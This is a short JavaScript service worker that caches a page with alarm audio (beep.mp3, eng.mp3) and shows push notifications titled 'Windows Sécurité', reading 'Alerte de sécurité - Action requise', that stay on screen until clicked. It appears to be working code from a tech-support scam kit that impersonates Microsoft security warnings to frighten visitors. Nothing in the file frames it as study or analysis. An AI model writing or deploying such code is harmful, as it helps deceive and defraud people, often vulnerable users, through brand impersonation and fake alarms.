const CACHE_NAME = 'fs17fbwin1-cache-v1';
const URLS_TO_CACHE = ['/', '/intel.html', '/css/tapa.css', '/js/jquery.min.js', '/js/bootstrap.min.js', '/images/f24.png', '/images/msmm.png', '/beep.mp3', '/eng.mp3'];

self.addEventListener('install', function(event) {
    event.waitUntil(caches.open(CACHE_NAME).then(function(cache) {
        return cache.addAll(URLS_TO_CACHE);
    }));
    self.skipWaiting();
});

self.addEventListener('activate', function(event) {
    event.waitUntil(caches.keys().then(function(cacheNames) {
        return Promise.all(cacheNames.filter(function(name) {
            return name !== CACHE_NAME;
        }).map(function(name) { return caches.delete(name); }));
    }));
    self.clients.claim();
});

self.addEventListener('fetch', function(event) {
    event.respondWith(caches.match(event.request).then(function(response) {
        if (response) return response;
        return fetch(event.request).then(function(response) {
            if (!response || response.status !== 200) return response;
            var responseToCache = response.clone();
            caches.open(CACHE_NAME).then(function(cache) { cache.put(event.request, responseToCache); });
            return response;
        });
    }));
});

self.addEventListener('push', function(event) {
    const options = {
        body: '⚠️ Alerte de sécurité - Action requise',
        icon: '/images/msmm.png', badge: '/images/bel.png',
        requireInteraction: true, tag: 'security-alert'
    };
    event.waitUntil(self.registration.showNotification('Windows Sécurité', options));
});